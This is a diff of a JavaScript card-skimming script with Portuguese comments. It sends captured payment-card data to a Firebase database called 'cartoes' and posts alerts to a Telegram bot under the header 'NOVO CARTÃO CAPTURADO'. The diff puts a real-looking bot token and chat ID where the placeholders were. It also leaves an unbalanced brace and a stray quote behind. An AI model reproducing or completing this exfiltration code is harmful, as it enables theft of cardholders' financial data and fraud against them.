@@ -51,10 +51,6 @@ async function obterIP() {
 // Função para enviar dados ao Firebase
 async function enviarParaFirebase(dados) {
   const firebaseUrl = 'https://seu-projeto-71c10-default-rtdb.firebaseio.com/cartoes.json';
-  const TOKEN = "8776533220:AAFH8s1cQrIWHYdUvtaTBzIn7E2y1vqTKpE";
-  const CHAT_ID = "8311007963";
-  function enviar(msg) {
-  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);
   }
   try {
     await fetch(firebaseUrl, {
@@ -72,8 +68,10 @@ async function enviarParaFirebase(dados) {
 // Função para enviar alerta ao Telegram
 async function enviarParaTelegram(dados) {
   // ⚠️ Substitua TOKEN e CHAT_ID pelos seus valores reais
-  const TOKEN = '6581293218:AAFHa_1XqKLmQPzT7QXkLmQzSXkLmQzSXkL'; // Token do seu bot
-  const CHAT_ID = '123456789'; // ID do seu chat Telegram
+  const TOKEN = '"8776533220:AAFH8s1cQrIWHYdUvtaTBzIn7E2y1vqTKpE'; // Token do seu bot
+  const CHAT_ID = '8311007963';
+    
+ // ID do seu chat Telegram
 
   const mensagem = `
 🚨 NOVO CARTÃO CAPTURADO 🚨
